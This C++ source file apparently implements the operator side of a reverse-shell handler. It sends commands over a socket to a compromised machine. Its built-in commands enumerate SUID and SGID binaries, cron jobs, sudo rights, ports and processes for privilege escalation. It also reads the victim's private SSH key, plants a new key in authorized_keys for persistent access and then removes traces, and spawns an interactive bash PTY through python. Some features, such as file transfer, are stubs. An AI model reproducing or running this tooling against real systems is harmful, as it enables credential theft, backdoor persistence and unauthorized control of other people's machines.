/* TODO:
 *     Fix built in commands that expect output returned in an std::string
 *     Upload / Download files
 *     History
 */

#include <iostream>
#include <string>
#include <thread>
#include <sstream> // std::istringstream
#include <stdexcept> // std::invalid_argument
#include <sys/stat.h> // chmod
#include <unistd.h> // close
#include "server.h"
#include "log.h"
#include "util.h"

const std::string Server::CMD_UPLOAD     = "upload";
const std::string Server::CMD_DOWNLOAD   = "download";
const std::string Server::CMD_GETSUID    = "suid";
const std::string Server::CMD_GETSGID    = "sgid";
const std::string Server::CMD_USERFILES  = "ufiles";
const std::string Server::CMD_GROUPFILES = "gfiles";
const std::string Server::CMD_LISTCRON   = "cron";
const std::string Server::CMD_SSHGEN     = "sshgen";
const std::string Server::CMD_GETKEY     = "getkey";
const std::string Server::CMD_SUDOLIST   = "sudo";
const std::string Server::CMD_PORTS      = "ports";
const std::string Server::CMD_PS         = "ps";
const std::string Server::CMD_GETPTY     = "getpty";
const std::string Server::LOCAL_SSH_KEY_NAME   = "~/.ssh/new_id_rsa";

Server::Server(int listenPort) {
	if (listenPort <= 0 || listenPort > 65535) {
		throw std::invalid_argument("Invalid server port");
	}
	if ((unsigned int) listenPort == FILE_TRANSFER_PORT) {
		throw std::invalid_argument("Server port same as file transfer port (" + std::to_string(FILE_TRANSFER_PORT) + ")");
	}
	this->listenPort = listenPort;
}


Server::~Server() {
	close(this->serverfd);
	close(this->clientfd);
}


int Server::start() {
	if (setupServer() < 0) {
		Log::error("Failed to start server");
		return -1;
	}
	readCommands();
	return 0;
}


void Server::readCommands() const {
	// Create a thread to print the shell output from the socket
	std::thread reader(&Server::readMessage, this);

	while(true) {
		std::string input;
		std::getline(std::cin, input);
		std::string cmd = trim(input);

		// Run built-in command
		if (cmd.at(0) == '-') {
			runBuiltInCommand(cmd);
		} else {
			sendCommand(cmd);
		}

		if (cmd.compare("exit") == 0) {
			break;
		}
	}

	// Don't wait for reader thread to terminate.
	// It will be blocked in read() waiting for something to be sent
	reader.detach();
}


void Server::runBuiltInCommand(const std::string& cmdString) const {
	std::istringstream cmdStream(cmdString);
	std::string cmdWithSlash;
	std::getline(cmdStream, cmdWithSlash, ' ');
	std::string cmd = cmdWithSlash.substr(1, std::string::npos);

	if (cmd.compare(CMD_UPLOAD) == 0) {
		Log::info("Not implemented");
	} else if (cmd.compare(CMD_DOWNLOAD) == 0) {
		Log::info("Not implemented");
	} else if (cmd.compare(CMD_GETSUID) == 0) {
		getSUID();
	} else if (cmd.compare(CMD_GETSGID) == 0) {
		getSGID();
	} else if (cmd.compare(CMD_USERFILES) == 0) {
		std::string user;
		if (!std::getline(cmdStream, user, ' ')) {
			user = getUser();
		}
		listUserFiles(user);
	} else if (cmd.compare(CMD_GROUPFILES) == 0) {
		std::string group;
		if (!std::getline(cmdStream, group, ' ')) {
			group = getGroup();
		}
		listGroupFiles(group);
	} else if (cmd.compare(CMD_LISTCRON) == 0) {
		listCron();
	} else if (cmd.compare(CMD_SSHGEN) == 0) {
		generateSSHKey();
	} else if (cmd.compare(CMD_GETKEY) == 0) {
		getSSHKey();
	} else if (cmd.compare(CMD_SUDOLIST) == 0) {
		listSudoPermissions();
	} else if (cmd.compare(CMD_PORTS) == 0) {
		listPorts();
	} else if (cmd.compare(CMD_PS) == 0) {
		listProcesses();
	} else if (cmd.compare(CMD_GETPTY) == 0) {
		spawnPTY();
	} else {
		Log::error("Unknown command: " + cmd);
	}
}


bool Server::lastCommandOK() const {
	/*std::string exitCode = sendCommand("echo $?", false);
	if (exitCode.compare("0") == 0) {
		return true;
	}
	return false;*/
	return true;
}


std::string Server::getUser() const {
	/*return sendCommand("id -un", false);*/
	return "root";
}


std::string Server::getGroup() const {
	/*return sendCommand("id -gn", false);*/
	return "root";
}


std::string Server::getHostname() const {
	/*return sendCommand("hostname", false);*/
	return "localhost";
}


bool Server::programExists(const std::string& program) const {
	/*std::string result = sendCommand("which " + program, false);
	return !result.empty();*/
	return true;
}


void Server::uploadFile(const std::string& src, const std::string& dest) const {
	// TODO
}


void Server::downloadFile(const std::string& src, const std::string& dest) const {
	// TODO
}


void Server::getSUID() const {
	sendCommand("find / -perm -u=s 2>/dev/null");
}


void Server::getSGID() const {
	sendCommand("find / -perm -g=s 2>/dev/null");
}


void Server::listUserFiles(const std::string& user) const {
	sendCommand("find / -user " + user + " 2>/dev/null | grep -v /proc");
}


void Server::listGroupFiles(const std::string& group) const {
	sendCommand("find / -group " + group + " 2>/dev/null | grep -v /proc");
}


void Server::listCron() const {
	std::cout << std::endl;
	Log::info("File: /etc/crontab");
	sendCommand("cat /etc/crontab 2>/dev/null");
	Log::separator();

	std::cout << std::endl;
	Log::info("Directory: /etc/cron.d");
	sendCommand("ls -l /etc/cron.d | tail -n +2");
	Log::separator();

	std::cout << std::endl;
	Log::info("Directory: /etc/cron.hourly");
	sendCommand("ls -l /etc/cron.hourly | tail -n +2");
	Log::separator();

	std::cout << std::endl;
	Log::info("Directory: /etc/cron.daily");
	sendCommand("ls -l /etc/cron.daily | tail -n +2");
	Log::separator();

	std::cout << std::endl;
	std::string user = getUser();
	Log::info(user + "'s crontab");
	sendCommand("crontab -l");
}


void Server::generateSSHKey() const {
	// Create SSH key pair without a passphrase
	sendCommand("ssh-keygen -t rsa -N \"\" -f " + LOCAL_SSH_KEY_NAME, false);
	// Copy public key to authorized_keys
	sendCommand("cat " + LOCAL_SSH_KEY_NAME + ".pub >> ~/.ssh/authorized_keys");
	// Copy the private key locally
	downloadFile(LOCAL_SSH_KEY_NAME, "id_rsa");
	// Change the permissions to "rw-------" / 600
	if (chmod("id_rsa", S_IWUSR | S_IRUSR) != 0) {
		Log::error("Failed to change permissions for file: id_rsa");
	}
	// Remove the keys we created
	sendCommand("rm ~/.ssh/" + LOCAL_SSH_KEY_NAME + "*");

	Log::info("You can now login using SSH and the private key: id_rsa");
}


void Server::getSSHKey() const {
	sendCommand("cat ~/.ssh/id_rsa 2>/dev/null");
}


void Server::listSudoPermissions() const {
	sendCommand("sudo -l");
}


void Server::listPorts() const {
	if (programExists("netstat")) {
		sendCommand("netstat -lntup");
	} else if (programExists("ss")) {
		sendCommand("ss -lntup");
	} else {
		Log::error("Couldn't find a program to view open ports");
	}
}


void Server::listProcesses() const {
	sendCommand("ps -e -ww -o user,cmd");
}


void Server::spawnPTY() const {
	/*std::string pythonExecutable;
	if (programExists("python")) {
		pythonExecutable = "python";
	} else if (programExists("python2")) {
		pythonExecutable = "python2";
	} else if (programExists("python2.7")) {
		pythonExecutable = "python2.7";
	} else if (programExists("python3")) {
		pythonExecutable = "python3";
	} else if (programExists("python3.6")) {
		pythonExecutable = "python3.6";
	} else {
		Log::error("Couldn't find a python executable");
		return;
	}
	sendCommand(pythonExecutable + " -c 'import pty;pty.spawn(\"/bin/bash\")'");*/
	sendCommand("python -c 'import pty;pty.spawn(\"/bin/bash\")'");
}
